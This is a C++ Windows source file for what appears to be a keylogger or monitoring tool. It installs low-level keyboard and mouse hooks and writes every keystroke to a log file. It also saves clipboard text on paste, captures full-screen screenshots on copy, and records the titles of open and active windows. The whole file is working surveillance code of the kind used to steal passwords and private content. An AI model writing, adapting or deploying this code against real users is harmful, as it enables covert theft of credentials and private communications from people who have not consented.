#include "stdafx.h"
#include <windows.h>
#include <WinUser.h>
#include <fstream>
#include "function.h"
#include <time.h>
#include <sstream>
#include <atlstr.h>
#include <chrono>
#include "resource.h"

HINSTANCE hinst;
HHOOK hhkKeyBoard, hhkMouse, hhkCBT;				//Declare the hooks
boolean cflag = false;								//Our Ctrl flag
extern HWND textLabel;								//Labels	

std::chrono::time_point<std::chrono::system_clock> startT, endT;


BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam)
{
std::ofstream out("logFile\\currentProcesses.txt", std::ios::app);
 if(IsWindowVisible(hwnd))																					//Checks to see if the window is visible
 {
	 char wnd_title[256];							
     GetWindowTextA(hwnd, wnd_title,sizeof(wnd_title));														//Gets window text
	 std::string finalstr = wnd_title;																		
	 out << "Processor: " <<finalstr << "\n";
 }
 out.close();
 return true;
}

void startTimer()
{
	startT = std::chrono::system_clock::now();																//Gets the current time of system_clock
}
void endTimer()
{
	std::ofstream out("logFile\\logFile.txt", std::ios::app);
	endT = std::chrono::system_clock::now();																//Gets the current time of system_clock					
	std::chrono::duration<double> elapsed_seconds = (endT-startT);											//Calculates the time difference
	out << "\n" << "Time Elapsed : " << elapsed_seconds.count() << "s";
	out << "\n[MONITORING....DEACTIVATED] \n";
	out.close();
}

void function::writeTime(){
	  std::ofstream out("logFile\\logFile.txt", std::ios::app);     
		time_t rawtime;																						//Creates Unix timestamp
		time (&rawtime);
		out << (ctime (&rawtime));
		out.close();
         }

void GetClipboardData()
{
	std::ofstream out("logFile\\clipboardContent.txt", std::ios::app);
	std::string clipBoardText;

	if (OpenClipboard(NULL))																				//Opens Clipboard and assigns it to current task
	{
		HANDLE clip;
		clip = GetClipboardData(CF_TEXT);																	//Retrieves data from clipboard
		clipBoardText = (LPSTR)GlobalLock(clip);															//Locks the object

		GlobalUnlock(clip);																					//Unlocks the object
		GlobalFree(clip);																					//Free up the memory that was allocated
		CloseClipboard();																					//Closes clipboard
	}

	out << clipBoardText;
	out.close();
}
void screenShot (void)
{

	int
    x1  = GetSystemMetrics(SM_XVIRTUALSCREEN),																//Gets the screen dimensions
    y1  = GetSystemMetrics(SM_YVIRTUALSCREEN),
    x2  = GetSystemMetrics(SM_CXVIRTUALSCREEN),
    y2  = GetSystemMetrics(SM_CYVIRTUALSCREEN),
    w   = x2 - x1,
    h   = y2 - y1;

	BITMAP bmpScreen;																						//Creates bitmap object
	HDC hDC = CreateCompatibleDC(0);																		
	HBITMAP bitMap = CreateCompatibleBitmap(GetDC(0), w, h);
	SelectObject(hDC, bitMap);
	
	BitBlt(hDC, 0, 0, w, h, GetDC(0), x1, y1, SRCCOPY);

	GetObject(bitMap, sizeof(BITMAP), &bmpScreen);
	
	BITMAPFILEHEADER   bmfHeader;    
    BITMAPINFOHEADER   bi;

	bi.biSize = sizeof(BITMAPINFOHEADER);    
    bi.biWidth = bmpScreen.bmWidth;    
    bi.biHeight = bmpScreen.bmHeight;  
    bi.biPlanes = 1;    
    bi.biBitCount = 32;    
    bi.biCompression = BI_RGB;    
    bi.biSizeImage = 0;  
    bi.biXPelsPerMeter = 0;    
    bi.biYPelsPerMeter = 0;    
    bi.biClrUsed = 0;    
    bi.biClrImportant = 0;

	DWORD dwBmpSize = ((bmpScreen.bmWidth * bi.biBitCount + 31) / 32) * 4 * bmpScreen.bmHeight;

	HANDLE hDIB = GlobalAlloc(GHND,dwBmpSize); 
    char *lpbitmap = (char *)GlobalLock(hDIB); 
	GetDIBits(hDC, bitMap, 0, (UINT)bmpScreen.bmHeight, lpbitmap, (BITMAPINFO *)&bi, DIB_RGB_COLORS);

	//**Uses the current times as the title of the file**//
	time_t t = time(0);
	struct tm * now = localtime( & t );
	int tmHour =now->tm_hour, tmMin = now->tm_min, tmSec = now->tm_sec;
	std::string ll = "ScreenShot[" + std::to_string (tmHour) + "_" + std::to_string (tmMin) + "_" + std::to_string (tmSec) +  "].bmp";
	
	HANDLE hFile = CreateFileA(ll.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	
	DWORD dwSizeofDIB = dwBmpSize + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    bmfHeader.bfOffBits = (DWORD)sizeof(BITMAPFILEHEADER) + (DWORD)sizeof(BITMAPINFOHEADER); 
    bmfHeader.bfSize = dwSizeofDIB; 
    bmfHeader.bfType = 0x4D42; 

	DWORD dwBytesWritten = 0;

    WriteFile(hFile, (LPSTR)&bmfHeader, sizeof(BITMAPFILEHEADER), &dwBytesWritten, NULL);
    WriteFile(hFile, (LPSTR)&bi, sizeof(BITMAPINFOHEADER), &dwBytesWritten, NULL);
    WriteFile(hFile, (LPSTR)lpbitmap, dwBmpSize, &dwBytesWritten, NULL);


	GlobalUnlock(hDIB);    
    GlobalFree(hDIB);
	
	DeleteObject(bitMap);
    SelectObject(hDC, bitMap);
    DeleteDC(hDC);
    ReleaseDC(NULL, hDC);
    DeleteObject(bitMap);

	return;
}

LRESULT CALLBACK CBTProc (int nCode, WPARAM wParam, LPARAM lParam)
{
	std::ofstream out("logFile\\logFile.txt", std::ios::app);
	CBTACTIVATESTRUCT *act = (CBTACTIVATESTRUCT *) lParam;
	
	 HWND hWnd = (HWND) wParam;
	 TCHAR wnd_title[1000];
	if(nCode == HCBT_ACTIVATE)																			//Checks for active/focus window
	{
		 SendMessage(hWnd, WM_GETTEXT, sizeof(wnd_title), LPARAM(wnd_title));							//Sends a message request for the window title
		 out << "Processor: " << wnd_title << "\n";	
	}
	out.close();
	return CallNextHookEx(hhkCBT, nCode, wParam, lParam);
}


LRESULT CALLBACK MouseHookProc (int nCode, WPARAM wParam, LPARAM lParam)
{
	MOUSEHOOKSTRUCT *pMouse = (MOUSEHOOKSTRUCT *) lParam;
	if (pMouse != NULL)
	{
		if (wParam == WM_LBUTTONDOWN)																	//Detects left clicks
		{
			//out << ("Mouse Position X = %d Mouse Position Y = %d\n", pMouse->pt.x, pMouse->pt.y);
		}
	}
	return (CallNextHookEx(hhkMouse, nCode, wParam, lParam));
}

//**Low-Level Keyboard Procedure**//
LRESULT CALLBACK KeyBoardHookProc (int nCode, WPARAM wParam, LPARAM lParam)
{
	std::ofstream out("logFile\\logFile.txt", std::ios::app);												//Opens file stream
	  PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT) (lParam);														//Declares structure and assigns pointer

	 int i = GetKeyState(0x14);																				//Assigns Caplock virtual key

	 if (p-> vkCode == VK_LCONTROL){                                                                        //Checks if Virtual Key is == Left Ctrl
            if (wParam == WM_KEYDOWN){                                                                      //Checks if the key is pressed down
               cflag = true;																				//Sets boolean flag to true
            }else{
                cflag = false;																				//else set to false
            }
    }

	 if (wParam == WM_KEYDOWN)																				//Checks for key press
	 {
		if(nCode == HC_ACTION && ((DWORD)lParam & 0x80000000) == 0)											
		{
		switch(p->vkCode)																					
		{
			//**Shortcut keys**//
		case 0x41:          out << (cflag?"[SELECT ALL]":"a");		break;
		case 0x43:          out << (cflag?"[COPY]":"c");  screenShot();       break;						//Calls upon the screenShot method
		case 0x53:          out << (cflag?"[SAVE]":"s");			break;
		case 0x56:          out << (cflag?"[PASTE]":"v"); GetClipboardData(); break;						//Calls upon the GetClipboardData method
		case 0x58:          out << (cflag?"[CUT]":"x");				break;
		case 0x59:          out << (cflag?"[REDO]":"y");			break;
		case 0x5A:          out << (cflag?"[UNDO]":"z");			break;  
			//**Function Keys**//
		case VK_RETURN:     out << "[ENTER]";   break;          
		case VK_MENU:       out << "[ALT]";     break;
		case VK_TAB:        out << "[TAB]";     break;
		case VK_CAPITAL:						break;
		case VK_INSERT:	    out << "[INSERT]";	break;
		case VK_END:	    out << "[END]";	    break;
		case VK_PRINT:	    out << "[PRINT]";	break;
		case VK_DELETE:	    out << "[DELETE]";  break;
		case VK_BACK:       out << "[BACK]";	break;
		case VK_LEFT:	    out << "[LEFT]";	break;
		case VK_RIGHT:	    out << "[RIGHT]";	break;
		case VK_UP:	        out << "[UP]";    	break;
		case VK_DOWN:	    out << "[DOWN]";	break;

			//**Grammar**//
		case VK_OEM_COMMA:  out << ",";			break;
		case VK_OEM_PERIOD: out << ".";			break;
		case VK_OEM_2:		out << "?";			break;

			//**Operators**//
		case VK_OEM_MINUS:  out << "-";			break;
		case VK_OEM_PLUS:	out << "+";			break;
		case VK_MULTIPLY:	out << "*";			break;
		case VK_OEM_7:		out << "\"";		break;

			//**Misc**//
		case VK_SHIFT:	   	break;
		case VK_RSHIFT:		break;
		case VK_LCONTROL:   break;
		case VK_RCONTROL:	break;

		default:			
			if (i == 0){                                                                                //Checks if caps lock is off
			out << char(tolower(p->vkCode)); break;														//Prints Results in lowercase
			}else{
				out << char(p->vkCode); break;
			}
		}
	}
}
out.close();
return(CallNextHookEx(hhkKeyBoard, nCode, wParam, lParam));												//Return hook
}


//**Installs the hooks**//
void function::install() { 
	std::ofstream out("logFile\\logFile.txt", std::ios::app);	
	out << ("[MONITORING....ACTIVATED] \n");
	hhkKeyBoard = SetWindowsHookEx(WH_KEYBOARD_LL, KeyBoardHookProc, NULL, NULL);		//Sets the keyboard hook
	hhkMouse	= SetWindowsHookEx(WH_MOUSE_LL, MouseHookProc, NULL, NULL);				//Sets the mouse hook
	startTimer();																		//Start Timer
	writeTime();																		//Print Current Time and Date
	EnumWindows(EnumWindowsProc,0);														//Iterate through background processors
	out.close();
}

//**Unhooks the hook**//
void function::uninstall() {
 endTimer();
 UnhookWindowsHookEx(hhkKeyBoard);														//Unhooks the keyboard hook
 UnhookWindowsHookEx(hhkMouse);															//Unhooks the mouse hook																			//Stops timer
}



